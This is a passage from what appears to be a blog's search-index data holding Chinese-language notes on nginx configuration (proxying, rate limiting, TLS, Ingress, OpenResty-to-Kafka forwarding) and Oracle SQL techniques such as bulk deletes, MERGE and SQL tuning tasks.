\"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:10","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#完整版本"},{"categories":["blog"],"content":" 静态页代理 简单版 location / { root /usr/share/nginx/html; index index.html; try_files $uri $uri/index.html /index.html; } 完整版本 server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; include /usr/local/nginx/conf/options/normal.conf; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } 容器版本 server { listen 80; listen [::]:80; server_name localhost default_server; client_max_body_size 200m; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:10","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#容器版本"},{"categories":["blog"],"content":" 功能配置","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#功能配置"},{"categories":["blog"],"content":" 黑/白名单/usr/local/nginx/conf/options/whitelist.conf # ip allow 1.1.1.1; # 网段 allow 10.0.0.0/16; # 默认拒绝所有 deny all; 可以包含在 http, server, location, limit_except 中。limit_except 是用来在 location 内部限制请求 method ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#黑白名单"},{"categories":["blog"],"content":" IP 限速 http { # 白名单 geo $whitelist { default 0; 10.0.0.0/8 1; 172.16.0.0/12 1; 192.168.0.0/16 1; 8.133.183.80 1; } # 白名单映射到空字符串,生成限速列表 map $whitelist $limit { 0 $binary_remote_addr; 1 \"\"; } # 应用限速列表,分配50m内存,每秒10次 # 10r/m分钟 10r/h小时 10r/d天 10r/w周 10r/y年 limit_req_zone $limit zone=iplimit:50m rate=10r/s; } # 域名限速 # burst代表最多蓄力100,即第一秒最多100+10次请求. # 默认110次请求排队发送,nodelay则会不排队,直接把110次请求一次性发送 server { limit_req zone=iplimit burst=100 nodelay; } 修改默认的 503 状态码（在 http 部分） limit_req_status 429; # 状态码 limit_req_log_level warn; # 记录warn级别的日志 多个 server_name 公用同一个 zone, 会导致低限速的一直影响高限速. 如果需要独立开, 应该配置多个 zone=xxx ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#ip-限速"},{"categories":["blog"],"content":" 代理 openai server { listen 8888; server_name ip; access_log /tmp/openai.com.log; location / { # 使用特定ca来验证证书,默认不验证 # proxy_ssl_verify on; # proxy_ssl_trusted_certificate /etc/nginx/conf.d/cacert.pem; # 默认不带SNI,会返回错误的证书,因此需要开启 proxy_ssl_server_name on; # 可以改变SNI的名称,但是没必要 # proxy_ssl_name www.baidu.com; proxy_set_header Host api.openai.com; proxy_pass https://api.openai.com; } } 相关资料: Nginx 反向代理，当后端为 Https 时的一些细节和原理 - XniLe - Ops 2.0 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#代理-openai"},{"categories":["blog"],"content":" grpc 配置 http { access_log /usr/local/var/log/nginx/access.log; upstream auth_services { server 0.0.0.0:50051; server 0.0.0.0:50052; } upstream laptop_services { server 0.0.0.0:50051; server 0.0.0.0:50052; } server { http2 on; listen 8080 ssl; # Mutual TLS between gRPC client and nginx ssl_certificate cert/server-cert.pem; ssl_certificate_key cert/server-key.pem; ssl_client_certificate cert/ca-cert.pem; ssl_verify_client on; location /techschool.pcbook.AuthService { grpc_pass grpcs://auth_services; # Mutual TLS between nginx and gRPC server grpc_ssl_certificate cert/server-cert.pem; grpc_ssl_certificate_key cert/server-key.pem; } location /techschool.pcbook.LaptopService { grpc_pass grpcs://laptop_services; # Mutual TLS between nginx and gRPC server grpc_ssl_certificate cert/server-cert.pem; grpc_ssl_certificate_key cert/server-key.pem; } } } Module ngx_http_grpc_module ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:4","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#grpc-配置"},{"categories":["blog"],"content":" 用户名密码 # 安装 apt install apache2-utils -y # 密码在 /usr/local/nginx/conf/passwd.db ,让你输入密码 htpasswd -c /usr/local/nginx/conf/passwd.db user1 # 配置使用用户名密码 location / { auth_basic \"需要输入用户名: 密码:\"; auth_basic_user_file /usr/local/nginx/conf/passwd.db; proxy_pass http://1.1.1.1:80; } # 微信的验证文件 location ^~ /MP_verify_ { root /usr/local/nginx/files; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:5","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#用户名密码"},{"categories":["blog"],"content":" 正则匹配匹配字符: ^ : 匹配输入字符串的起始位置 $ : 匹配输入字符串的结束位置 . : 匹配除 \\n 之外的任何单个字符，若要匹配包括“\\n”在内的任意字符，请使用诸如 [.\\n] 之类的模式 \\s: 匹配任意的空格符 匹配长度: *: 任意个数 +: 1 次以上 ?: 0 或 1 次 匹配范围 [c]: 匹配单个字符 c [a-zA-Z0-9]: 1 个字符 (): 表达式的内容. 例如 (jpg|gif|swf) 匹配优先级 = location 完整路径,进行路径匹配, 但只是记住这个最长的路径. location ^~ 否定正则.上面的路径如果包含 ^~ ,那么使用并停止匹配. location ~* 正则 和 location ~ 区分大小写正则 顺序匹配. 匹配到了就选用. location 部分起始路径. 没有正则匹配到, 那么开始选用第二步的匹配 / 还是没有匹配, 则用 / 路径 示例: # api-docs结尾的全部拦截 location ~ /api-docs$ { default_type application/json; return 200 '{\"status\":\"success\",\"result\":\"nginx json\"}'; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:6","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#正则匹配"},{"categories":["blog"],"content":" 移动端检测Detect Mobile Browsers - Open source mobile phone detection location /mobile-page { set $is_mobile 0; if ($http_user_agent ~* \"(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows ce|xda|xiino\") { set $is_mobile 1; } if ($http_user_agent ~* \"^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1 u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp( i|ip)|hs\\-c|ht(c(\\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac( |\\-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\\/)|klon|kpt |kwc\\-|kyo(c|k)|le(no|xi)|lg( g|\\/(k|l|u)|50|54|\\-[a-w])|libw|lynx|m1\\-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m\\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\\-2|po(ck|rt|se)|prox|psio|pt\\-g|qa\\-a|qc(07|12|21|32|60|\\-[2-7]|i\\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\\-|oo|p\\-)|sdk\\/|se(c(\\-|0|1)|47|mc|nd|ri)|sgh\\-|shar|sie(\\-|m)|sk\\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\\-|v\\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\\-|tdg\\-|tel(i|m)|tim\\-|t\\-mo|to(pl|sh)|ts(70|m\\-|m3|m5)|tx\\-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\\-|your|zeto|zte\\-)\") { set $is_mobile 1; } # =0是pc端 =1是移动端 if ($is_mobile = 0) { return 302 https://www.kentxxq.com$request_uri; } proxy_set_header Host $host; proxy_pass http://1.1.1.1:80; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:7","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#移动端检测"},{"categories":["blog"],"content":" 返回 200 location /string { default_type text/html; return 200 \"维护中\"; } location /json { default_type application/json; return 200 '{\"status\":\"success\",\"result\":\"nginx json\"}'; } location /metrics { default_type text/plain; return 200 'metrics'; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:8","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#返回-200"},{"categories":["blog"],"content":" 微信验证文件 location /MP_verify_ { root /usr/local/nginx/data; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:9","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#微信验证文件"},{"categories":["blog"],"content":" 405 错误 - post 请求静态文件 # 这一行加在server的第一层，不能加在location位置 error_page 405 =200 $uri; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:10","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#405-错误---post-请求静态文件"},{"categories":["blog"],"content":" 防止嵌入 iframe # frame-ancestors 谁能嵌入我 # frame-src 我可以嵌入哪些站点 # 参考 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors # 当前站点,a.com,b.com,以及子域名 # 空格间隔,不同参数分号隔开 add_header Content-Security-Policy \"frame-ancestors 'self' a.com b.com *.a.com *.b.com; frame-src 'self' a.com b.com *.a.com *.b.com\"; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:11","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#防止嵌入-iframe"},{"categories":["blog"],"content":" 官网非 www 跳转 server { listen 80; server_name kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; } server { http2 on; listen 443 ssl; server_name kentxxq.com; client_max_body_size 2048M; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/kentxxq.com.log k-json; # 302临时跳转 return 302 https://www.kentxxq.com$request_uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:3:12","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#官网非-www-跳转"},{"categories":["blog"],"content":" 守护进程Systemd 守护配置 /etc/systemd/system/nginx.service [Unit] Description=The NGINX HTTP and reverse proxy server After=syslog.target network-online.target remote-fs.target nss-lookup.target Wants=network-online.target # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] Type=forking PIDFile=/run/nginx.pid ExecStartPre=/usr/local/nginx/sbin/nginx -t ExecStart=/usr/local/nginx/sbin/nginx ExecReload=/usr/local/nginx/sbin/nginx -s reload ExecStop=/bin/kill -s QUIT $MAINPID # 会导致无法导出prof文件 # PrivateTmp=true # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:4:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#守护进程"},{"categories":["blog"],"content":" Ingress-nginx 配置双层 nginx,第二层的 ingress-nginx 需要配置这个 use-forwarded-headers: 'true' 负载均衡,默认 round_robin. 还有 ip_hash,least_conn. 可以参考 ConfigMap - Ingress-Nginx Controller nginx.ingress.kubernetes.io/upstream-hash-by: 'ip_hash' Ingress 的 yml 文件配置示例: kind: Ingress apiVersion: networking.k8s.io/v1 metadata: name: gateway.gateway.com namespace: default annotations: kubectl.kubernetes.io/last-applied-configuration: \u003e {\"apiVersion\":\"networking.k8s.io/v1\",\"kind\":\"Ingress\",\"metadata\":{\"annotations\":{\"kubernetes.io/ingress.class\":\"nginx\",\"nginx.ingress.kubernetes.io/cors-allow-headers\":\"uid,download,repeat,DNT,X-CustomHeader,X-LANG,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,X-Api-Key,X-Device-Id,Access-Control-Allow-Origin,authorization\",\"nginx.ingress.kubernetes.io/cors-allow-methods\":\"PUT, GET, POST, OPTIONS, DELETE\",\"nginx.ingress.kubernetes.io/cors-allow-origin\":\"*\",\"nginx.ingress.kubernetes.io/enable-cors\":\"true\"},\"name\":\"gateway.kentxxq.com\",\"namespace\":\"default\"},\"spec\":{\"ingressClassName\":\"nginx\",\"rules\":[{\"host\":\"gateway.kentxxq.com\",\"http\":{\"paths\":[{\"backend\":{\"service\":{\"name\":\"gateway\",\"port\":{\"number\":8090}}},\"path\":\"/\",\"pathType\":\"Prefix\"}]}}],\"tls\":[{\"hosts\":[\"gateway.kentxxq.com\"],\"secretName\":\"a.kentxxq.com-secret\"}]}} kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/cors-allow-headers: \u003e- uid,download,repeat,DNT,X-CustomHeader,X-LANG,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,X-Api-Key,X-Device-Id,Access-Control-Allow-Origin,authorization nginx.ingress.kubernetes.io/cors-allow-methods: 'PUT, GET, POST, OPTIONS, DELETE' nginx.ingress.kubernetes.io/cors-allow-origin: '*' nginx.ingress.kubernetes.io/enable-cors: 'true' # 下面是手动添加内容，用于压测或自定义 nginx.ingress.kubernetes.io/server-snippet: | location /200_ingress_nginx { default_type text/html; return 200 \"200_ingress_nginx\"; } spec: ingressClassName: nginx tls: - hosts: - gateway.kentxxq.com secretName: a.kentxxq.com-secret rules: - host: gateway.kentxxq.com http: paths: - path: / pathType: Prefix backend: service: name: gateway port: number: 8090 - path: /200_ingress_to_nginx pathType: Prefix backend: service: name: test-nginx port: number: 80 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:5:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#ingress-nginx-配置"},{"categories":["blog"],"content":" Openrestry 转发给 kafka","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:6:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#openrestry-转发给-kafka"},{"categories":["blog"],"content":" 依赖配置以前做过这个, 但是现在觉得没有必要. 因为我对 lua 语言不熟悉, 而且觉得 nginx 做负载就好了, 不应该嵌入一些业务需求. GitHub - doujiang24/lua-resty-kafka: Lua kafka client driver for the Openresty based on the cosocket API # nginx.conf http { lua_package_path \"/path/to/lua-resty-kafka/lib/?.lua;;\"; ... } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:6:1","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#依赖配置"},{"categories":["blog"],"content":" 转发配置 server { http2 on; listen 443 ssl; server_name a.kentxxq.com; access_log /data/weblog/nginx/logs/a.kentxxq.com.access.log main; lua_need_request_body on; include /usr/local/openresty/nginx/conf/option/ssl_kentxxq.com.conf; location /lua { default_type 'text/html'; content_by_lua 'ngx.say(\"hello world！\")'; } location /api/livereportorgan/playbackRecord { proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; default_type 'application/json'; content_by_lua ' local cjson = require \"cjson\" local client = require \"resty.kafka.client\" local producer = require \"resty.kafka.producer\" local uuid = require \"resty.uuid\" local broker_list = { { host = \"ip1\", port = 9092 }, { host = \"ip2\", port = 9092 }, { host = \"ip3\", port = 9092 }, } local message = {} message[\"uri\"]=ngx.var.uri message[\"args\"]=ngx.var.args message[\"host\"]=ngx.var.host message[\"request_body\"]=ngx.var.request_body message[\"remote_addr\"] = ngx.var.http_x_forwarded_for message[\"remote_user\"] = ngx.var.remote_user message[\"time_local\"] = ngx.var.time_iso8601 message[\"status\"] = ngx.var.status message[\"body_bytes_sent\"] = ngx.var.body_bytes_sent message[\"http_referer\"] = ngx.var.http_referer message[\"http_user_agent\"] = ngx.var.http_user_agent message[\"http_x_forwarded_for\"] = ngx.var.http_x_forwarded_for message[\"upstream_response_time\"] = ngx.var.upstream_response_time message[\"request_time\"] = ngx.var.request_time message[\"http_token\"] = ngx.var.http_token message[\"terminalType\"] = ngx.var.http_terminalType message[\"header\"] = ngx.var.header message[\"uuid\"] = uuid.generate() -- 转换json为字符串 local message = cjson.encode(message); -- 定义kafka异步生产者 -- this is async producer_type and bp will be reused in the whole nginx worker local bp = producer:new(broker_list, { producer_type = \"sync\" }) local ok, err = bp:send(\"playback_duration_notice_org\", nil, message) if not ok then local response = {} response[\"code\"]=\"1\" response[\"message\"]=err response[\"data\"]=\"true\" local response = cjson.encode(response); ngx.say(response) return end local delayData = {delay = 60} local response = {code = \"0\", message = \"success\", data = delayData} local response = cjson.encode(response); ngx.say(response) '; } } server { listen 80; server_name a.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:6:2","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#转发配置-1"},{"categories":["blog"],"content":" 相关内容 使用 ACME 免费 ssl 证书 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:7:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#相关内容"},{"categories":["point"],"content":"oracle 是一种关系型数据库, 类似 mssql, mysql. 要点: 收费 用户量大 国内互联网几乎不用 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/oracle/:0:0","series":null,"tags":["point","oracle"],"title":"oracle","uri":"/posts/%E7%AC%94%E8%AE%B0/point/oracle/#"},{"categories":["blog"],"content":"因为以前的公司是用 [[笔记/point/oracle|oracle]],所以也记录了不少的命令. 记录一下后续使用.","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["blog"],"content":" 简介因为以前的公司是用 oracle,所以也记录了不少的技巧. 记录一下后续使用. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:1:0","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#简介"},{"categories":["blog"],"content":" SQL 操作","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:0","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#sql-操作"},{"categories":["blog"],"content":" 字段操作 # 字符串截取 substr(t.family_no,0,6)='433127' # 日期转换 systimestamp 时间戳 sysdate 日期 to_date('20170101','yyyymmdd') to_char(sysdate,'YYYY-MM-DD HH24:MI:SS') # 值判断 CASE WHEN A.STR7 IS NULL THEN '0' ELSE '0001' END AS haha, # 类似case when,v1就取r1,v2就取r2 DECODE(column_name, 'value1', 'result1', 'value2', 'result2', 'default_result') # 长度判断 where length(a.id_card)\u003e=14 # 在列表中 where D.IDENTITY IN('0001','17','20','19') # 值为null就默认0 NVL(A.CIVIL_MONEY,0) # 转数字 to_number(NVL(A.STR5,0) ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:1","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#字段操作"},{"categories":["blog"],"content":" 加速插入 alter table x nologging; insert /*+append*/ into x (a,b,c) as select a,b,c from xxx; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:2","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#加速插入"},{"categories":["blog"],"content":" 批量删除 # 批量删除.根据时间排序,1000条commmit一次 declare cursor [del_cursor] is select a.*, a.rowid row_id from [table_name] a order by a.rowid; begin for v_cusor in [del_cursor] loop if v_cusor.[time_stamp] \u003c to_date('2014-01-01','yyyy-mm-dd') then delete from [table_name] where rowid = v_cusor.row_id; end if; if mod([del_cursor]%rowcount,1000)=0 then commit; end if; end loop; commit; end; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:3","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#批量删除"},{"categories":["blog"],"content":" 两表数据同步 MERGE INTO t_canhe_family t1 USING(select a1.family_id,a1.account_money,a1.balance,a1.remaining_money from t_canhe_family_bak20161121 a1) tt ON (tt.family_id=t1.family_id) when matched then update set t1.account_money=tt.account_money, t1.balance=tt.balance, t1.remaining_money=tt.remaining_money ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:4","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#两表数据同步"},{"categories":["blog"],"content":" sql 优化 查看执行计划 select /*+ gather_plan_statistics */ * from table(dbms_xplan.display_cursor(NVL('ajkqn4733r2qx',NULL),NULL,'ALL ALLSTATS LAST PEEKED_BINDS cost partition -projection -outline')); 查看 session 执行的 sql SELECT c.spid, b.sql_text, a.sid, a.serial#, osuser, machine FROM v$session a, v$sqlarea b ,v$process c WHERE a.sql_address = b.address and a.paddr=c.addr and spid=\u0026pid; sql-tuning创建并执行 tuning 任务 DECLARE my_task_name VARCHAR2(300); my_sqltext CLOB; BEGIN my_sqltext := 'select a.join_year,a.\"FAMILY_INFO_ID\",a.\"FAMILY_NO\",a.\"CARD_NO\",a.\"FAMILY_NO\" as BOOK_NO ,a.\"CENTER_NO\",a.\"AREA_NO\",a.\"COUNTRY_NO\", substr(a.\"FAMILY_NO\",-4,4) as DOOR_NO,a.\"MASTER_NO\",a.\"ADDRESS\",a.\"POSTALCODE\",a.\"PHONECODE\",a.\"LINKMAN\",a.\"EMAIL\",a.\"POPULATION\", a.\"FARMER\",a.\"FARMER_STAY\",a.\"JOIN_PROP\",a.\"DOOR_PROP\",a.\"RPR_TYPE\",a.\"INOUT_FLAG\",a.\"INOUT_DATE\",a.\"INOUT_REASON\",a.\"SALVATION\", a.\"REGISTER\",a.\"REGISTER_DATE\",a.\"BOOK_STATE\",a.\"CARD_STATE\",a.\"FAMILY_STATE\",a.\"AUDI_MAN\",a.\"AUDI_STATE\",a.\"AUDI_TIME\",a.\"UPDATE_TIME\", a.\"UPDATE_MAN\",a.\"CREATE_TIME\",a.\"CREATE_MAN\",a.\"COMMENTS\",a.\"IS_DEL\",a.\"FRONT_STATE_D301\",a.\"STR1\",a.\"STR2\",a.\"STR3\",a.\"STR4\",a.\"STR5\", a.\"ZHEN_NO\",a.\"CUN_NO\",a.\"MASTER_NAME\" from T_NH_CANHE_FAMILYS a where a.is_del=1 and exists (select 1 from t_nh_dict_area x where a.country_no=x.countrycode and x.state=1)'; my_task_name := DBMS_SQLTUNE.CREATE_TUNING_TASK( sql_text =\u003e my_sqltext, user_name =\u003e 'XIANGXI', -- 必须大写 scope =\u003e 'COMPREHENSIVE', time_limit =\u003e 20, task_name =\u003e 'tuning_sql_test', description =\u003e 'Task to tune a query on a specified table'); DBMS_SQLTUNE.EXECUTE_TUNING_TASK( task_name =\u003e 'tuning_sql_test'); END; 查看具体内容: select dbms_sqltune.report_tuning_task('tuning_sql_test') from dual; 使用完毕后删除: //sys用户删除 delete from dba_advisor_tasks where task_name ='tuning_sql_test' 